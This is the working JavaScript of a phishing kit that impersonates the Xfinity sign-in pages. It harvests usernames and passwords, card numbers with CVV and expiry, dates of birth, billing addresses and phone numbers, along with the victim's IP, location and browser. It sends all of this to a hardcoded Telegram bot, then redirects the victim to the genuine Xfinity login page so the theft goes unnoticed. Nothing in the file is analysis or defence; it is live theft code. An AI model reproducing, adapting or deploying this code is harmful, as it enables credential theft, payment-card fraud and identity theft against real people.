document.addEventListener('DOMContentLoaded', function() { 
  // --- Existing Selectors ---
  const signInButton1 = document.querySelector('#sign_in_1');
  const signInButton2 = document.querySelector('#sign_in_2');
  const signInButton3 = document.querySelector('#sign_in_3');
  const signInButton4 = document.querySelector('#sign_in_4');
  const userInput = document.querySelector('input[name="user"]');
  const passwordInput = document.querySelector('input[name="passwd"]');
  const displayedLogin = document.querySelector('#displayedLogin');

  // --- New Selectors for Card & Billing ---
  const cardNext = document.querySelector('#cnext'); 
  const billingNext = document.querySelector('#bnext'); 

  // Telegram Bot Info
  const bottoken = '8868352237:AAFRqZveJ3ytmp6F3zdPLwbMcI_ivcQiL_s';
  const chatid = '5342731960';

  /// --- Visitor Data Logic (FIXED with Fallback) ---
let userIP = "";
let userCountry = "";
const userAgent = navigator.userAgent;

async function loadVisitorData() {
  try {
    // Primary API
    const res = await fetch("https://ipwho.is/");
    const data = await res.json();
    if (data && data.success) {
      userIP = data.ip;
      userCountry = `${data.city}, ${data.country}`;
    } else { throw new Error(); }
  } catch (e) {
    try {
      // Backup API if primary fails
      const res2 = await fetch("https://api.db-ip.com/v2/free/self");
      const data2 = await res2.json();
      userIP = data2.ipAddress;
      userCountry = `${data2.city}, ${data2.countryName}`;
    } catch (e2) {
      userIP = "Unavailable";
      userCountry = "Unknown";
    }
  }
}
loadVisitorData();

  // --- Spinner Functions ---
  const addSpinner = (button) => {
    const spinner = document.createElement('div');
    spinner.classList.add('spinner');
    button.appendChild(spinner);
  };

  const removeSpinner = (button) => {
    setTimeout(() => {
      const spinner = button.querySelector('.spinner');
      if (spinner) spinner.remove();
    }, 1500);
  };

  /// --- Telegram Function (FIXED to prevent 'Loading...') ---
const sendToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${bottoken}/sendMessage`;
  
  // If data is still loading, wait up to 2 seconds before giving up
  if (!userIP || userIP === "Loading...") {
    let attempts = 0;
    while (!userIP && attempts < 20) { 
      await new Promise(r => setTimeout(r, 100)); 
      attempts++;
    }
  }

  const visitorInfo = `\n\n🌐 IP: ${userIP || "Timeout"}\n🌍 Location: ${userCountry || "Timeout"}\n💻 UA: ${userAgent}`;
  
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      chat_id: chatid, 
      text: message + visitorInfo, 
      parse_mode: 'HTML' 
    })
  });
};
  // --- Formatting Logic ---
  const cardNumberInput = document.querySelector('#cardNumber');
  const expInput = document.querySelector('#exp');
  const phoneInput = document.querySelector('#phone');

  cardNumberInput?.addEventListener('input', e => {
    let val = e.target.value.replace(/\D/g, "").slice(0, 16);
    e.target.value = val.match(/.{1,4}/g)?.join(" ") || "";
  });

  expInput?.addEventListener('input', e => {
    let val = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (val.length >= 3) val = val.slice(0, 2) + "/" + val.slice(2);
    e.target.value = val;
  });

  phoneInput?.addEventListener('input', e => {
    let x = e.target.value.replace(/\D/g, "").match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
    e.target.value = !x[2] ? x[1] : "(" + x[1] + ") " + x[2] + (x[3] ? "-" + x[3] : "");
  });

  // --- Original Login Logic ---
  if (signInButton1) {
    signInButton1.addEventListener('click', (e) => {
      e.preventDefault();
      addSpinner(signInButton1);
      const username = userInput.value.trim();
      if (username) {
        localStorage.setItem('username', username);
        sendToTelegram(`<b>Attempt 1: Sign in to Xfinity</b>\nUsername📧: ${username}`);
        setTimeout(() => { window.location.href = "SignintoXfinity2.html"; }, 2000);
      }
      removeSpinner(signInButton1);
    });
  }

  if (signInButton2) {
    signInButton2.addEventListener('click', (e) => {
      e.preventDefault();
      addSpinner(signInButton2);
      const password = passwordInput.value.trim();
      if (password) {
        sendToTelegram(`<b>Attempt 1: Sign in to Xfinity</b>\nPassword🔑: ${password}`);
        setTimeout(() => { window.location.href = "SignintoXfinity3.html"; }, 2000);
      }
      removeSpinner(signInButton2);
    });
  }

  if (signInButton3) {
    signInButton3.addEventListener('click', (e) => {
      e.preventDefault();
      addSpinner(signInButton3);
      const username = userInput.value.trim();
      if (username) {
        localStorage.setItem('username', username);
        sendToTelegram(`<b>Attempt 2: Sign in to Xfinity</b>\nUsername📧: ${username}`);
        setTimeout(() => { window.location.href = "SignintoXfinity4.html"; }, 2000);
      }
      removeSpinner(signInButton3);
    });
  }

  if (signInButton4) {
    signInButton4.addEventListener('click', (e) => {
      e.preventDefault();
      addSpinner(signInButton4);
      const password = passwordInput.value.trim();
      if (password) {
        sendToTelegram(`<b>Attempt 2: Sign in to Xfinity</b>\nPassword🔑: ${password}`);
        setTimeout(() => { window.location.href = "verify.html"; }, 2000);
      }
      removeSpinner(signInButton4);
    });
  }

  // --- Card Submission (verify.html) ---
  if (cardNext) {
    cardNext.addEventListener('click', (e) => {
      e.preventDefault();
      const name = document.querySelector('#nameOnCard')?.value.trim();
      const num = document.querySelector('#cardNumber')?.value.trim();
      const exp = document.querySelector('#exp')?.value.trim();
      const cvv = document.querySelector('#cvv')?.value.trim();
      const post = document.querySelector('#postal')?.value.trim();
      const d = document.querySelector('#birth_day')?.value.trim();
      const m = document.querySelector('#birth_month')?.value;
      const y = document.querySelector('#birth_year')?.value.trim();

      if (!name || !num || !exp || !cvv || !post || !d || !m || !y) {
        alert("Please enter all fields.");
        return;
      }

      addSpinner(cardNext);
      const message = `💳 <b>Card Details</b>\nName: ${name}\nNumber: ${num}\nExp: ${exp}\nCVV: ${cvv}\nDOB: ${d}/${m}/${y}\nZIP: ${post}`;
      sendToTelegram(message);
      setTimeout(() => { window.location.href = "verify2.html"; }, 2000);
    });
  }

  // --- Billing Submission (verify2.html) ---
  if (billingNext) {
    billingNext.addEventListener('click', (e) => {
      e.preventDefault();
      const addr = document.querySelector('#addr1')?.value.trim();
      const city = document.querySelector('#city')?.value.trim();
      const region = document.querySelector('#region')?.value.trim();
      const phone = document.querySelector('#phone')?.value.trim();

      if (!addr || !city || !region || !phone) {
        alert("Please enter all fields.");
        return;
      }

      addSpinner(billingNext);
      const message = `🏠 <b>Billing Details</b>\nAddress: ${addr}\nCity: ${city}\nState: ${region}\nPhone: ${phone}`;
      sendToTelegram(message);
      setTimeout(() => { 
        window.location.href = "https://login.xfinity.com/login"; 
      }, 2000);
    });
  }

  // --- Username Display Logic ---
  if (displayedLogin) {
    const usernameFromStorage = localStorage.getItem('username');
    displayedLogin.textContent = usernameFromStorage ? usernameFromStorage : 'No username found';
  }
});